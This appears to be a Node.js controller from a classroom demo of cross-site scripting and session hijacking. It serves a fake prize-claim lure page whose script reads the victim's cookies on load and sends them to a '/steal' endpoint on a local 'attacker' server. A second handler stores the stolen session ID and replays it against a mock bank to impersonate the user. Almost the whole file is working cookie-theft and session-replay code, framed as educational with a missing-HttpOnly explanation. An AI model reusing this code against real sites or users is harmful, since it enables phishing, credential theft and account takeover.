const http = require("http");
const stolenSessions = require("../db/stolenSessions");

exports.getMaliciousPage = (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Free Prize Claim – You're a Winner! 🎉</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #1a0533 0%, #0d1b2a 100%);
      min-height: 100vh; display: flex;
      align-items: center; justify-content: center;
    }
    .container { text-align: center; max-width: 600px; padding: 40px 24px; }
    .badge {
      display: inline-block; background: #fbbf24; color: #78350f;
      font-size: 12px; font-weight: 700; padding: 6px 14px;
      border-radius: 20px; letter-spacing: 1px;
      text-transform: uppercase; margin-bottom: 24px;
    }
    h1 { color: #f1f5f9; font-size: 42px; font-weight: 800; line-height: 1.2; margin-bottom: 16px; }
    .subtitle { color: #94a3b8; font-size: 18px; margin-bottom: 40px; }
    .prize-box {
      background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
      border-radius: 16px; padding: 32px; margin-bottom: 32px;
      backdrop-filter: blur(10px);
    }
    .prize-icon { font-size: 72px; margin-bottom: 16px; }
    .prize-name { color: #38bdf8; font-size: 24px; font-weight: 700; margin-bottom: 8px; }
    .prize-desc { color: #64748b; font-size: 14px; }
    .claim-btn {
      display: inline-block; background: linear-gradient(135deg, #f59e0b, #ef4444);
      color: white; font-size: 18px; font-weight: 700;
      padding: 16px 48px; border-radius: 50px;
      border: none; cursor: pointer; text-decoration: none;
      box-shadow: 0 0 30px rgba(245,158,11,0.4);
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%, 100% { box-shadow: 0 0 30px rgba(245,158,11,0.4); }
      50%       { box-shadow: 0 0 60px rgba(245,158,11,0.7); }
    }
    .fine-print { color: #475569; font-size: 11px; margin-top: 24px; }

    /* ── Status panel (shows result of cookie theft) ── */
    #status-panel {
      margin-top: 40px;
      background: #0f172a; border-radius: 12px;
      padding: 24px; text-align: left;
      border: 1px solid #1e3a5f; display: none;
    }
    #status-panel h3 { color: #f59e0b; font-size: 13px; text-transform: uppercase;
      letter-spacing: 1px; margin-bottom: 12px; }
    .log-line { font-family: monospace; font-size: 12px;
      color: #a3e635; margin-bottom: 6px; }
    .log-line.red { color: #f87171; }
    .log-line.blue { color: #60a5fa; }

    /* ── Attack explanation box ── */
    .explain-box {
      margin-top: 32px; background: rgba(239,68,68,0.1);
      border: 1px solid rgba(239,68,68,0.3); border-radius: 12px;
      padding: 20px; text-align: left;
    }
    .explain-box h3 { color: #f87171; margin-bottom: 12px; font-size: 14px; }
    .explain-box p  { color: #94a3b8; font-size: 13px; line-height: 1.7; }
    code { background: #1e293b; padding: 2px 6px; border-radius: 4px; color: #a3e635; font-size: 12px; }
  </style>
</head>
<body>
  <div class="container">
    <div class="badge">🎊 Congratulations!</div>
    <h1>You've Been Selected!</h1>
    <p class="subtitle">Claim your exclusive reward before it expires</p>

    <div class="prize-box">
      <div class="prize-icon">🏆</div>
      <div class="prize-name">$500 Amazon Gift Card</div>
      <div class="prize-desc">Limited time offer — expires in 10 minutes</div>
    </div>

    <button class="claim-btn" onclick="claimPrize()">CLAIM MY PRIZE →</button>
    <div class="fine-print">No purchase necessary. Void where prohibited.</div>

    <!-- Attack status panel — updates in real time -->
    <div id="status-panel">
      <h3>🕵️ Attack Log (Attacker's View)</h3>
      <div id="log-output"></div>
    </div>

    <div class="explain-box">
      <h3>📖 What's happening under the hood?</h3>
      <p>
        When this page loaded (or when you click Claim), the hidden script executed
        <code>document.cookie</code> in your browser. Since the Legitimate Server set the
        <code>session_id</code> cookie <strong>without the HttpOnly flag</strong>, JavaScript
        can read it. The stolen value is then sent via a GET request to the attacker's
        <code>/steal</code> endpoint. The attacker now holds your session ID and can
        impersonate you — no password required.
      </p>
    </div>
  </div>

  <!--
    ============================================================
    THE XSS PAYLOAD
    ============================================================
    In a real XSS attack this script would be INJECTED into the
    legitimate server's page through an input field, URL param,
    or stored comment. Here we show it explicitly for educational
    purposes on the attacker's own page.

    The key line is:
        var stolen = document.cookie;
    This reads ALL cookies the browser holds for the current domain.
    Because the Legitimate Server did NOT use HttpOnly, the session
    cookie is readable here.
    ============================================================
  -->
  <script>
    function log(msg, cls = '') {
      const panel = document.getElementById('status-panel');
      const out   = document.getElementById('log-output');
      panel.style.display = 'block';
      const line = document.createElement('div');
      line.className = 'log-line ' + cls;
      line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
      out.appendChild(line);
    }

    // ── XSS Payload: executes immediately on page load ──────────────────────
    (function xssPayload() {
      // Step 1: Read the victim's cookies (possible because HttpOnly is absent)
      var stolenCookies = document.cookie;

      log('🎣 XSS payload fired!', 'red');
      log('📋 Cookies found: ' + (stolenCookies || '(none — you may not be logged in)'), 'red');

      if (!stolenCookies) {
        log('⚠️  No cookies detected. Log into SecureBank (port 3000) first, then revisit this page.', 'blue');
        return;
      }

      // Step 2: Extract the session_id
      var match = stolenCookies.match(/session_id=([a-f0-9]+)/);
      if (match) {
        log('🔑 session_id extracted: ' + match[1], 'red');
      }

      // Step 3: Exfiltrate — send stolen cookies to the attacker's collection endpoint
      log('📡 Sending stolen cookies to attacker server...', 'blue');

      fetch('http://localhost:4000/steal?cookies=' + encodeURIComponent(stolenCookies))
        .then(r => r.json())
        .then(data => {
          log('✅ Cookies received by attacker!', 'red');
          log('🚀 Attacker is now using session to access your account...', 'red');

          // Step 4: Show the attacker using the stolen session
          if (data.session_id) {
            log('🔓 Accessing victim account with stolen session...', 'blue');
            return fetch('http://localhost:3000/profile?session=' + data.session_id);
          }
        })
        .then(r => r && r.json())
        .then(profile => {
          if (profile && profile.status === 'success') {
            log('💀 ACCOUNT HIJACKED: Logged in as "' + profile.authenticated_as + '" without password!', 'red');
            log('💰 Balance visible: ' + profile.account_data.balance_checking, 'red');
          }
        })
        .catch(err => {
          log('ℹ️  Fetch error (expected in cross-origin demo): ' + err.message, 'blue');
          log('✅ Cookie was still sent to /steal endpoint. Check attacker server console.', 'blue');
        });
    })();

    // Button click also re-triggers
    function claimPrize() {
      log('--- Button clicked: re-running payload ---', 'blue');
      xssPayload();
    }
  </script>
</body>
</html>
  `);
};

exports.stealCookies = (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");

  const rawCookies = decodeURIComponent(req.query.cookies || "");

  console.log("\n[ATTACKER SERVER] 🚨 ====== COOKIES STOLEN ======");
  console.log("[ATTACKER SERVER] 📋 Raw cookie string:", rawCookies);

  const match = rawCookies.match(/session_id=([a-f0-9]+)/);
  const sessionId = match ? match[1] : null;

  if (sessionId) {
    console.log("[ATTACKER SERVER] 🔑 Extracted session_id:", sessionId);

    // Store for later use
    stolenSessions.push({
      sessionId,
      rawCookies,
      timestamp: new Date().toISOString(),
    });

    // Now use the stolen session to access the legitimate server
    console.log(
      "[ATTACKER SERVER] 🕵️  Attempting to use stolen session on Legitimate Server...",
    );

    // Make a server-side request to the legitimate server using the stolen session
    const options = {
      hostname: "localhost",
      port: 3000,
      path: `/profile?session=${sessionId}`,
      method: "GET",
    };

    const proxyReq = http.request(options, (proxyRes) => {
      let body = "";
      proxyRes.on("data", (chunk) => (body += chunk));
      proxyRes.on("end", () => {
        try {
          const parsed = JSON.parse(body);
          if (parsed.status === "success") {
            console.log("[ATTACKER SERVER] 💀 SESSION HIJACK SUCCESSFUL!");
            console.log(
              "[ATTACKER SERVER] 👤 Impersonating user:",
              parsed.authenticated_as,
            );
            console.log(
              "[ATTACKER SERVER] 💰 Account data:",
              JSON.stringify(parsed.account_data, null, 2),
            );
          }
        } catch (e) {
          /* ignore parse errors */
        }
      });
    });
    proxyReq.on("error", () => {});
    proxyReq.end();

    return res.json({
      status: "stolen",
      session_id: sessionId,
      message: "Session ID captured. Attacker is now using it.",
    });
  }

  console.log(
    "[ATTACKER SERVER] ⚠️  No session_id found in cookies:",
    rawCookies,
  );
  res.json({ status: "no_session", raw: rawCookies });
};
